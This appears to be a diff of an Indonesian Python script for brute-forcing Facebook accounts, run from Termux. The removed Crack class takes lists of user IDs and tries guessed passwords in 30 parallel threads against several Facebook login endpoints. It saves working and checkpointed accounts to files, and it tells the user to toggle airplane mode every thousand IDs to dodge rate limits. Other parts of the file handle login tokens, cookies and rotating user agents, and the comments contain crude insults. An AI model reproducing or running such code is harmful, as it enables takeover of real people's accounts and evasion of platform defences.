@@ -1,103 +1,37 @@
-# coding=utf-8
-# coding by romi
-# Izin dlu lah bro kalau mau recode, gk ngotak njir _-
-# Note : jangan di ubah lagi! nanti error, script udah enak
-try:
-	import mechanize
-except ImportError:
-	catet_mek = ('# • sedang menginstall modul mechanize •')
-	meka = rich.markdown.Markdown(catet_mek, style='green')
-	rich.console.Console().print(meka)
-	os.system('pip install mechanize')
-try:
-	import stdiomask
-except ImportError:
-	catet_mask = ('# • sedang menginstall modul stdiomask •')
-	mask = rich.markdown.Markdown(catet_mask, style='green')
-	rich.console.Console().print(mask)
-	os.system('pip install stdiomask')
-
-# MODULE
-import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
-import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
-from concurrent.futures import ThreadPoolExecutor
+#-----------------[ IMPORT-MODULE ]-------------------
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup as parser
-from threading import (Thread, Event)
-from time import sleep as jeda
-from datetime import datetime
-
-
-import os, sys, subprocess, platform
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
 try:
-	import rich
+        import rich
 except ImportError:
-	print ('\n\t\x1b[0m >_< mohon tunggu... >_<\n')
-	os.system('pip install rich')
-	
-import rich
-from rich.markdown import Markdown
-from rich.console import Console
-
+        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
+        os.system('pip install rich')
+try:
+        import stdiomask
+except ImportError:
+        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
+        os.system('pip install stdiomask')
 try:
 	import requests
 except ImportError:
-	catet_req = ('# • sedang menginstall modul requests •')
-	requ = rich.markdown.Markdown(catet_req, style='green')
-	rich.console.Console().print(requ)
-	os.system('pip install requests')
-try:
-	import concurrent.futures
-except ImportError:
-	catet_futur = ('# • sedang menginstall modul futures •')
-	ft = rich.markdown.Markdown(catet_futur, style='green')
-	rich.console.Console().print(ft)
-	os.system('pip install futures')
-try:
-	import bs4
-except ImportError:
-	catet_bs = ('# • sedang menginstall modul bs4 •')
-	soup = rich.markdown.Markdown(catet_bs, style='green')
-	rich.console.Console().print(soup)
-	os.system('pip install bs4')
-try:
-	import mechanize
-except ImportError:
-	catet_mek = ('# • sedang menginstall modul mechanize •')
-	meka = rich.markdown.Markdown(catet_mek, style='green')
-	rich.console.Console().print(meka)
-	os.system('pip install mechanize')
-try:
-	import stdiomask
-except ImportError:
-	catet_mask = ('# • sedang menginstall modul stdiomask •')
-	mask = rich.markdown.Markdown(catet_mask, style='green')
-	rich.console.Console().print(mask)
-	os.system('pip install stdiomask')
-	
-	
-bff_2 = open(os.devnull, "w")
-my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=bff_2,stderr=subprocess.STDOUT)
-bff_2.close()
-if my_music !=0:
-	catet_play = ('# • sedang menginstall play-audio •')
-	play = rich.markdown.Markdown(catet_play, style='green')
-	rich.console.Console().print(play)
-	os.system('pkg install play-audio')
-	
-Mr = '\x1b[1;91m' 
-Hj = '\x1b[1;92m' 
-Mt = '\x1b[0m'
+	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
+	os.system('pip install requests && pip install mechanize ')
 
-# MODULE
-import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
-import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
-from concurrent.futures import ThreadPoolExecutor
-from bs4 import BeautifulSoup as parser
-from threading import (Thread, Event)
-from time import sleep as jeda
-from datetime import datetime
 
-# TANGGAL BULAN 
+#TANGGALBULAN 
 ct = datetime.now()
 n = ct.month
 bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
@@ -195,7 +129,7 @@ def romz_xyz(cookie,venom={}):
 			venom.update({kuki[0]: kuki[1]})
 	return venom
 
-# MENU MASUK
+#MENU MASUK
 def login():
 	try:
 		token = open('.token.txt','r').read()
@@ -433,7 +367,7 @@ class pilihan:
 		except:
 			pass
 			
-# USER AGENT
+#------------------[ USER-AGENT ]-------------------#
 pretty.install()
 CON=sol()
 ugen2=[]
@@ -503,85 +437,6 @@ def uaku():
 		for un in aa:
 			ua.write(un+'\n')
 		ua=open('.ua.txt','r').read().splitlines()
-		
-# MULAI CRACK 
-pwx = []
-class Crack:
-	
-	def __init__(self):
-		self.id = []
-		self.url = "https://mbasic.facebook.com"
-		
-	def romiy(self, id):
-		self.id = id
-		#print ('\n%s%s%s jumlah Id%s > %s%s'%(U,til,O,M,H,len(self.id)))
-		unikers = input('\n%s%s%s gunakan password manual? y/t%s > %s'%(U,til,O,M,K))
-		if unikers in ('Y', 'y'):
-			print ('\n%s%s%s contoh%s >%s sayang%s,%spengen%s,%sngentot'%(U,til,O,M,O,M,O,M,O))
-			while True:
-				pwx = input('%s%s%s password %s> %s'%(U,til,O,M,K))
-				if pwx == '':
-					print ('\n%s%s jangan kosong '%(M,til))
-				elif len(pwx)<=5:
-					print ('\n%s%s password minimal 6 karakter'%(M,til))
-					exit()
-				else:
-					def manual(brute=None):
-						ind = input('\n%s#%s Pilih %s>%s '%(P,O,M,K))
-						if ind =='':
-							print("%s%s isi yang benar kentod "%(M,til))
-							manual()
-						elif ind in ('1', '01'):
-							print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
-							print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
-							jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
-							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
-								for akun in self.id:
-									try:
-										_heck_ = akun.split('<=>')[0]
-										TitidNeverDie.submit(self.touch, _heck_, brute)
-									except: pass
-							hasil(ok,cp)
-						elif ind in ('2', '02'):
-							print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
-							print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
-							jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
-							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
-								for akun in self.id:
-									try:
-										_heck_ = akun.split('<=>')[0]
-										TitidNeverDie.submit(self.basic, _heck_, brute)
-									except: pass
-							hasil(ok,cp)
-						elif ind in ('3', '03'):
-							print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
-							print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
-							jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
-							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
-								for akun in self.id:
-									try:
-										_heck_ = akun.split('<=>')[0]
-										TitidNeverDie.submit(self.mobil, _heck_, brute)
-									except: pass
-							hasil(ok,cp)
-						else:
-							print ('\n%s%s isi yang benar kentod'%(M,til))
-							manual()
-					print ('\n%s•%s [ %spilih methode login, silahkan coba satu² %s]\n'%(U,O,U,O))
-					print ('%s• %s01%s methode %sfree %s(fast) '%(U,P,O,M,O))
-					print ('%s• %s02%s methode %smbasic %s(slow) '%(U,P,O,P,O))
-					print ('%s• %s03%s methode %smobile %s(very slow) '%(U,P,O,H,O))
-					manual(pwx.split(','))
-					break
-		elif unikers in ('T', 't'):
-			print ('\n%s•%s [ %spilih methode login, silahkan coba satu²%s ]\n'%(U,O,U,O))
-			print ('%s• %s01%s methode %sfree %s(fast)'%(U,P,O,M,O))
-			print ('%s• %s02%s methode %smbasic %s(slow) '%(U,P,O,P,O))
-			print ('%s• %s03%s methode %smobile %s(very slow) '%(U,P,O,H,O))
-			self.langsung()
-		else:
-			print("%s%s Isi yang benar kentod "%(M,til));jeda(2)
-			pilihan().menu()
 	
 	# LANGSUNG
 	def langsung(self):
